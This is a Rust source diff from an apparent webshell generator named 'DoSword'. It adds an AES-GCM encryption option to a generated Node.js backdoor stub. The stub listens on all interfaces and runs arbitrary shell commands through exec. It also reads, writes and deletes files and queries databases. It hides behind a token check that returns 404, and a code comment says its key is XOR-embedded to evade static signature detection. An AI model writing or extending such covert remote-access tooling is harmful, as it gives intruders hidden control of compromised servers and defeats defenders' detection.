@@ -20,7 +20,55 @@ pub fn node_stub(
     h_touch: &str,
     h_dbprobe: &str,
     h_dbquery: &str,
+    aead_ikm: Option<&str>,
 ) -> String {
+    let (codec_helpers, codec_decode, codec_encode) = match aead_ikm {
+        Some(ikm) => (
+            r#"const IKM = Buffer.from(dec('{IKMX}', '{AXK}'), 'hex');
+const AKEY = Buffer.from(crypto.hkdfSync('sha256', IKM, Buffer.from('dosword/aead/v2'), Buffer.from('dsw2'), 32));
+const A_SEEN = new Map();
+function aeadOpen(b64) {
+  const f = Buffer.from(b64 || '', 'base64');
+  if (f.length < 36) throw new Error('bad frame');
+  const nonce = f.subarray(0, 12), sb = f.subarray(12, 20), rest = f.subarray(20);
+  const seq = sb.readBigUInt64BE(0);
+  const sid = nonce.subarray(0, 8).toString('hex');
+  const last = A_SEEN.get(sid);
+  if (last !== undefined && seq <= last) throw new Error('replay');
+  const d = crypto.createDecipheriv('aes-256-gcm', AKEY, nonce);
+  d.setAAD(Buffer.concat([Buffer.from('dsw2'), Buffer.from([1]), sb]));
+  d.setAuthTag(rest.subarray(rest.length - 16));
+  const plain = Buffer.concat([d.update(rest.subarray(0, rest.length - 16)), d.final()]);
+  A_SEEN.set(sid, seq);
+  if (A_SEEN.size > 512) A_SEEN.clear();
+  return plain;
+}
+function aeadSeal(data) {
+  const nonce = crypto.randomBytes(12);
+  const seq = process.hrtime.bigint();
+  const sb = Buffer.alloc(8); sb.writeBigUInt64BE(seq);
+  const c = crypto.createCipheriv('aes-256-gcm', AKEY, nonce);
+  c.setAAD(Buffer.concat([Buffer.from('dsw2'), Buffer.from([2]), sb]));
+  const ct = Buffer.concat([c.update(data), c.final()]);
+  return Buffer.concat([nonce, sb, ct, c.getAuthTag()]).toString('base64');
+}"#
+            // IKM（= SHA256(密码) 的十六进制）以 XOR 形式嵌入：避免静态特征直接命中
+            .replace("{IKMX}", &crate::encoder::xor_hex(ikm, xk))
+            .replace("{AXK}", xk)
+            .to_string(),
+            "aeadOpen(form.get('formData')).toString()".to_string(),
+            "aeadSeal(Buffer.from(JSON.stringify(out)))".to_string(),
+        ),
+        None => (
+            format!(
+                "const KEY = Buffer.from(dec('{key_hex}', '{xk}'), 'utf8');\nfunction x(d) {{ const b = Buffer.isBuffer(d) ? d : Buffer.from(d); return Buffer.from(b.map((v, i) => v ^ KEY[i % KEY.length])); }}",
+                key_hex = key_hex,
+                xk = xk
+            ),
+            "x(Buffer.from(form.get('formData'), 'base64')).toString()".to_string(),
+            "x(Buffer.from(JSON.stringify(out))).toString('base64')".to_string(),
+        ),
+    };
     format!(
         r#"// DoSword generated stub (node, xor)
 const http = require('http');
@@ -31,8 +79,7 @@ const path = require('path');
 const os = require('os');
 
 function dec(hexstr, k) {{ let out = ''; for (let i = 0; i < hexstr.length; i += 2) out += String.fromCharCode(parseInt(hexstr.substr(i, 2), 16) ^ k.charCodeAt((i / 2) % k.length)); return out; }}
-const KEY = Buffer.from(dec('{key_hex}', '{xk}'), 'utf8');
-function x(d) {{ const b = Buffer.isBuffer(d) ? d : Buffer.from(d); return Buffer.from(b.map((v, i) => v ^ KEY[i % KEY.length])); }}
+{codec_helpers}
 function h(op) {{ return parseInt(crypto.createHash('md5').update(op).digest('hex').slice(0, 8), 16).toString(); }}
 const H = {{ probe: '{h_probe}', exec: '{h_exec}', list: '{h_list}', read: '{h_read}', write: '{h_write}', delete: '{h_delete}', rename: '{h_rename}', mkdir: '{h_mkdir}', touch: '{h_touch}', dbprobe: '{h_dbprobe}', dbquery: '{h_dbquery}' }};
 
@@ -44,7 +91,7 @@ http.createServer((req, res) => {{
     let out = {{ ok: true, data: {{}} }};
     try {{
       const form = new URLSearchParams(body);
-      const reqObj = JSON.parse(x(Buffer.from(form.get('formData'), 'base64')).toString());
+      const reqObj = JSON.parse({codec_decode});
       // S12：请求体内嵌 token 必须匹配（缺失或不匹配即 404）
       if (reqObj.token !== dec('{token_hex}', '{xk}')) {{ res.writeHead(404); res.end(); return; }}
       const a = reqObj.a || '';
@@ -72,7 +119,7 @@ http.createServer((req, res) => {{
         }} else {{
           exec(c + ' 2>&1', {{ encoding: 'buffer' }}, (err, stdout) => {{
             out.data = {{ stdout: stdout.toString('base64'), cwd: process.cwd() }};
-            res.end(JSON.stringify({{ data: x(Buffer.from(JSON.stringify(out))).toString('base64'), code: 200 }}));
+            res.end(JSON.stringify({{ data: {codec_encode}, code: 200 }}));
           }});
           return;
         }}
@@ -149,11 +196,10 @@ http.createServer((req, res) => {{
     }} catch (e) {{
       out = {{ ok: false, error: String(e && e.message ? e.message : e) }};
     }}
-    res.end(JSON.stringify({{ data: x(Buffer.from(JSON.stringify(out))).toString('base64'), code: 200 }}));
+    res.end(JSON.stringify({{ data: {codec_encode}, code: 200 }}));
   }});
 }}).listen(PORT, '0.0.0.0', () => console.log('DoSword node stub listening on ' + PORT));
 "#,
-        key_hex = key_hex,
         h_probe = h_probe,
         h_exec = h_exec,
         h_list = h_list,
@@ -165,6 +211,9 @@ http.createServer((req, res) => {{
         h_touch = h_touch,
         h_dbprobe = h_dbprobe,
         h_dbquery = h_dbquery,
+        codec_helpers = codec_helpers,
+        codec_decode = codec_decode,
+        codec_encode = codec_encode,
     )
     .replace("{xk}", xk)
     .replace("{gk_hex}", gk_hex)
